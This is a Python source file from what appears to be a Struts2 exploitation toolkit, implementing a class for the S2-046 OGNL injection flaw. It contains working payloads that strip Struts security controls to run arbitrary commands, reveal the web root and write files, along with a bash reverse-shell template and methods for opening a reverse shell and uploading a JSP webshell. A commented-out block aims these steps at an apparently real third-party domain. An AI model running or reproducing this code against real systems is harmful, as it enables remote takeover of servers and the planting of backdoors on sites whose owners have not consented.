import click
from exploit import tools
import urllib.request, urllib.error, urllib.parse
import time

class S2_046:
    """S2-046漏洞检测利用类"""
    info = "[+] S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹Linux shell和文件上传"
    web_path = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=ENCODING')).(#res.getWriter().print('')).(#res.getWriter().print('')).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath('/'))).(#res.getWriter().flush()).(#res.getWriter().close())}\0b"
    check_poc = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=ENCODING')).(#res.getWriter().print('security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}\x00b"
    exec_payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=ENCODING')).(#s=new java.util.Scanner((new java.lang.ProcessBuilder('CMD'.toString().split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA')).(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}\0b"
    upload_paylaod = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=ENCODING')).(#filecontent='SHELL').(new java.io.BufferedWriter(new java.io.FileWriter('PATH')).append(new java.net.URLDecoder().decode(#filecontent,'ENCODING')).close()).(#res.getWriter().print('O')).(#res.getWriter().print('K')).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())}\0b"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = tools.parser_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def encode_multipart(self, exp):
        boundary = '----------%s' % hex(int(time.time() * 1000))
        data = list()
        data.append('--%s' % boundary)
        content = b'x'
        decoded_content = content.decode('ISO-8859-1')
        data.append('Content-Disposition: form-data; name="test"; filename="{exp}"'.format(exp=exp))
        data.append('Content-Type: text/plain\r\n')
        data.append(decoded_content)
        data.append('--%s--\r\n' % boundary)
        return '\r\n'.join(data), boundary

    def exec(self, url, exp, headers=None, encoding="UTF-8"):
        try:
            Attack_data, boundary = self.encode_multipart(exp)
            headers['Content-Type'] = 'multipart/form-data; boundary=%s' % boundary

            if tools._proxies:
                proxy_support = urllib.request.ProxyHandler(tools._proxies)
                opener = urllib.request.build_opener(proxy_support, urllib.request.HTTPSHandler)
                urllib.request.install_opener(opener)

            request = urllib.request.Request(url, headers=headers, data=Attack_data.encode())
            html = urllib.request.urlopen(request).read().decode(encoding).strip()

            return html

        except urllib.error.URLError as e:
            if "timeout" in e:
                return "ERROR:" + "HTTP连接超时错误"
            else:
                return "ERROR:" + e.reason
        except Exception as e:
            return 'ERROR:' + str(e)

    def check(self):
        """检测漏洞是否存在"""
        payload = self.check_poc
        html = self.exec(self.url, payload, self.headers)
        if html == 'security_check':
            self.is_vul = True
            return 'S2-046'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        html = self.exec(self.url, self.web_path, self.headers)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.exec_payload.replace('CMD', cmd).replace('ENCODING', self.encoding)
        html = self.exec(self.url, payload, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = tools.reverse_shell(self, ip, port)
        return html

    def upload_shell(self, upload_path, shell_path):
        shell = tools.read_file(shell_path, self.encoding)
        payload = self.upload_paylaod.replace('SHELL', urllib.parse.quote(shell)).replace('PATH', upload_path).replace('ENCODING', self.encoding)
        html = self.exec(self.url, payload, self.headers, self.encoding)
        if 'OK' in html:
            return True
        else:
            click.echo("[!] Please try to access the upload result of the confirmed file")
            return False

# if __name__ == '__main__':
#     s = S2_046("http://gzyfymp.med.gzhc365.com/")
#     tools._proxies = proxies = {
#         "http":"127.0.0.1:8080",
#         "https":"127.0.0.1:8080"
#     }
#     print(s.check())
#     print(s.get_path())
#     print(s.exec_cmd('ls -la'))
#     s.reverse_shell('192.168.3.134', '4444')
#     print(s.upload_shell('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))